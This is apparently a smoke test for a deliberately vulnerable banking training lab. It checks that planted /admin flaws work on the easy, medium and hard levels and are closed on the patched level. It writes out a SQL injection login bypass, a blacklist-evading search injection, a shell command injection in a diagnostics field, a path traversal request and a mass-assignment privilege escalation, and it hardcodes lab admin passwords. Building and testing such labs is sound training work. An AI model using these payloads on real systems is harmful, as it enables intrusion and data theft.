"""Stage 7 smoke test — /admin panel across every lab level.

Each level gets a throwaway copy of the seeded database and upload directory.
Checks that each intended hole is open on the level it belongs to and closed
on `patched` (and, where relevant, on `hard`).
"""

import json
import os
import re
import shutil
import sqlite3
import sys
import tempfile
from urllib.parse import quote

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

SRC_DB = os.path.join(ROOT, "db", "nusabank.db")
PW = "password"
ADMIN_CREDS = {"admin": "NusaAdmin!2024", "cs123": "NusaCS!2024",
               "finance456": "NusaFinance!2024"}


def make_client(level, tmpdir):
    db_copy = os.path.join(tmpdir, f"nusabank-{level}.db")
    shutil.copyfile(SRC_DB, db_copy)
    uploads = os.path.join(tmpdir, f"uploads-{level}")
    shutil.copytree(os.path.join(ROOT, "uploads"), uploads, dirs_exist_ok=True)
    os.environ.update(LAB_LEVEL=level, NUSABANK_DB=db_copy,
                      NUSABANK_UPLOADS=uploads, NUSABANK_COOKIE_SECURE="0")
    from app import create_app

    app = create_app({"DB_PATH": db_copy, "UPLOAD_DIR": uploads})
    return app, db_copy


def csrf(client, path="/admin/login"):
    body = client.get(path).data.decode("utf-8", "replace")
    m = re.search(r'name="csrf_token" value="([^"]+)"', body)
    return m.group(1) if m else "nusabank-csrf-static-token"


def raw(db_path, sql, params=()):
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    try:
        return conn.execute(sql, params).fetchall()
    finally:
        conn.close()


def exec_sql(db_path, sql, params=()):
    conn = sqlite3.connect(db_path)
    conn.execute(sql, params)
    conn.commit()
    conn.close()


def admin_login(client, username, password):
    return client.post("/admin/login",
                       data={"username": username, "password": password,
                             "csrf_token": csrf(client)},
                       follow_redirects=False)


def is_admin_content(resp):
    body = resp.data.decode("utf-8", "replace")
    return resp.status_code == 200 and "Navigasi administrator" in body


def row_links(resp):
    return resp.data.decode("utf-8", "replace").count('href="/admin/users/')


def run(level):
    from app.security import _RATE

    tmpdir = tempfile.mkdtemp(prefix=f"stage7-{level}-")
    app, db_path = make_client(level, tmpdir)
    out = {"level": level}

    # --- 1) Customer session reaching /admin (broken access control) ------
    cust = app.test_client()
    out["customer_login"] = cust.post(
        "/login", data={"username": "budi01", "password": PW}).status_code
    r = cust.get("/admin/")
    out["customer_to_admin"] = is_admin_content(r)
    out["customer_flag"] = "FLAG{flag_in_admin_panel}" in r.data.decode("utf-8", "replace")

    # --- 2) Admin login with customer credentials -------------------------
    _RATE.clear()
    out["customer_creds_admin"] = admin_login(
        app.test_client(), "budi01", PW).status_code

    # --- 3) SQLi auth bypass on the admin login ---------------------------
    _RATE.clear()
    sqli_client = app.test_client()
    out["sqli_admin_login"] = admin_login(sqli_client, "admin' --", "apa-saja").status_code
    out["sqli_admin_flag"] = "FLAG{flag_in_admin_panel}" in sqli_client.get(
        "/admin/").data.decode("utf-8", "replace")

    # --- 4) Proper admin session -----------------------------------------
    client = app.test_client()
    _RATE.clear()
    out["admin_login"] = admin_login(client, "admin", ADMIN_CREDS["admin"]).status_code
    dash = client.get("/admin/")
    out["admin_dashboard"] = is_admin_content(dash)
    out["admin_flag"] = "FLAG{flag_in_admin_panel}" in dash.data.decode("utf-8", "replace")
    if not out["admin_dashboard"]:
        return out

    # --- 5) Search SQLi in the customer list ------------------------------
    # `' OR 1=1 OR '` closes the LIKE literal and leaves a valid boolean chain
    # that survives the hard-level blacklist (no UNION / -- / /* / ;).
    payload = "' OR 1=1 OR '"
    baseline = row_links(client.get("/admin/users?q=zzzzz"))
    injected = row_links(client.get("/admin/users?q=" + quote(payload)))
    out["search_baseline"] = baseline
    out["search_rows"] = injected
    out["search_injected"] = injected > baseline

    # --- 6) Mass assignment: role_id=2 escalates a customer ---------------
    target = raw(db_path, "SELECT id FROM users WHERE username='ani02'")[0]["id"]
    exec_sql(db_path, "UPDATE users SET role_id = 1 WHERE id = ?", (target,))
    r = client.post(f"/admin/users/{target}",
                    data={"full_name": "Ani Wijaya", "role_id": "2",
                          "csrf_token": csrf(client, f"/admin/users/{target}")})
    out["mass_assign_status"] = r.status_code
    out["mass_assign_escalated"] = raw(
        db_path, "SELECT role_id FROM users WHERE id = ?", (target,))[0]["role_id"] == 2

    # --- 7) Command injection in diagnostics ------------------------------
    # The page echoes the submitted host back into the form, so look for the
    # marker inside the command-output <pre> only.
    marker = "NUSABANK_INJECTED"
    r = client.post("/admin/diagnostics",
                    data={"host": f"127.0.0.1 | echo {marker}",
                          "csrf_token": csrf(client, "/admin/diagnostics")})
    body = r.data.decode("utf-8", "replace")
    m = re.search(r"Keluaran:</p>\s*<pre class=\"code-block\">(.*?)</pre>",
                  body, re.S)
    out["cmdi_status"] = r.status_code
    out["cmdi_injected"] = bool(m) and marker in m.group(1)

    # --- 8) Role separation (admin_cs acting as finance) ------------------
    exec_sql(db_path, "UPDATE claims SET status = 'submitted' WHERE id = 1")
    a = app.test_client()
    _RATE.clear()
    admin_login(a, "admin", ADMIN_CREDS["admin"])
    can = a.post("/admin/claims/1/review",
                 data={"decision": "approved", "csrf_token": csrf(a, "/admin/claims")})
    exec_sql(db_path, "UPDATE claims SET status = 'submitted' WHERE id = 1")

    cs = app.test_client()
    _RATE.clear()
    out["cs_login"] = admin_login(cs, "cs123", ADMIN_CREDS["cs123"]).status_code
    out["cs_claims_page"] = cs.get("/admin/claims").status_code
    r = cs.post("/admin/claims/1/review",
                data={"decision": "approved", "csrf_token": csrf(cs, "/admin/kyc")})
    out["admin_review_status"] = can.status_code
    out["cs_review_status"] = r.status_code
    out["cs_review_applied"] = raw(
        db_path, "SELECT status FROM claims WHERE id = 1")[0]["status"] == "approved"

    # --- 9) KYC approve / path traversal / CSV export ---------------------
    doc = raw(db_path, "SELECT id FROM kyc_documents WHERE status='pending' "
                       "ORDER BY id LIMIT 1")
    if doc:
        r = client.post(f"/admin/kyc/{doc[0]['id']}/review",
                        data={"decision": "verified",
                              "csrf_token": csrf(client, "/admin/kyc")})
        out["kyc_review_status"] = r.status_code
        out["kyc_verified"] = raw(
            db_path, "SELECT status FROM kyc_documents WHERE id = ?",
            (doc[0]["id"],))[0]["status"] == "verified"

    # Path traversal: a sentinel one level above the upload root.
    secret = os.path.join(tmpdir, "traversal-secret.txt")
    with open(secret, "w", encoding="utf-8") as fh:
        fh.write("NUSABANK_TRAVERSAL_SECRET")
    r = client.get("/admin/files?name=../traversal-secret.txt")
    out["traversal_status"] = r.status_code
    out["traversal_leak"] = b"NUSABANK_TRAVERSAL_SECRET" in r.data

    r = client.get("/admin/reports/export?type=users")
    out["csv_status"] = r.status_code
    out["csv_mimetype"] = r.mimetype

    # --- 10) Every admin page renders ------------------------------------
    pages = ["/admin/users", "/admin/kyc", "/admin/claims", "/admin/transactions",
             "/admin/tickets", "/admin/audit", "/admin/reports", "/admin/files",
             "/admin/settings", "/admin/diagnostics", "/admin/users/4",
             "/admin/tickets/1"]
    out["pages"] = {p: client.get(p).status_code for p in pages}

    return out


def main():
    results = {}
    for level in ("easy", "medium", "hard", "patched"):
        try:
            results[level] = run(level)
        except Exception as exc:  # noqa: BLE001
            import traceback
            traceback.print_exc()
            results[level] = {"level": level, "error": repr(exc)}

    print("\n=== SUMMARY ===")
    for level, data in results.items():
        print(level, "->", json.dumps(
            {k: v for k, v in data.items() if k not in ("level", "pages")},
            ensure_ascii=False))
        if "pages" in data:
            print("   pages:", data["pages"])


if __name__ == "__main__":
    main()
